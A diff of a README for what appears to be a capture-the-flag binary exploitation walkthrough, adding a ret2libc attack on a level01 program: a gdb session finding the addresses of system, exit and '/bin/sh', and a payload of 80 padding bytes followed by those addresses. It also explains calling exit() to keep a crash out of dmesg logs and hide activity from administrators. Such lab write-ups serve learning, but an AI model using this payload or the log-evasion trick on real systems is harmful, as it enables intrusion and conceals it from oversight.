@@ -71,12 +71,38 @@ Program received signal SIGSEGV, Segmentation fault.
 
 In the previous project, [Rainfall](https://github.com/anyashuka/Rainfall), our strategy was to copy shellcode to the stack and jump to it (a classic stack-based buffer overflow). 
 
-Unfortunately, that we can't do that here since the program calls ```puts()``` instead of ```printf()``` (a vulnerable function).
+We've found a more elegant solution to use here: a ret2libc ("return-to-libc") attack, which will overwrite the EIP return address with a particular libc function address directly. 
 
-We're going to use ret2libc ("return-to-libc") instead, which will overwrite the EIP return address with a particular libc function address directly. 
+In this case, we''re going to overwrite the EIP with the address of ```system```, "/bin/sh", and ```exit()```.
+```
+(gdb) b *main
+Breakpoint 1 at 0x80484d0
+
+(gdb) r
+Starting program: /home/users/level01/level01
+
+Breakpoint 1, 0x080484d0 in main ()
+
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+(gdb) print exit
+$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+
+(gdb) find &system,+9999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:	 "/bin/sh"
+```
 
 
 
+Why add the ```exit()```? Because if we don't, then the shell will segfault upon exit – which will be recorded in the dmesg logs and visible to any system admin who looks... So basically, to erase our footsteps! 
+
+
+[ 80 x "A" ] [ address of system ] [ address of exit ] [ address of "/bin/sh" ]
 
 So finally our attack payload will be : “padding –> address of system() –> address of exit() –> /bin/sh“
 
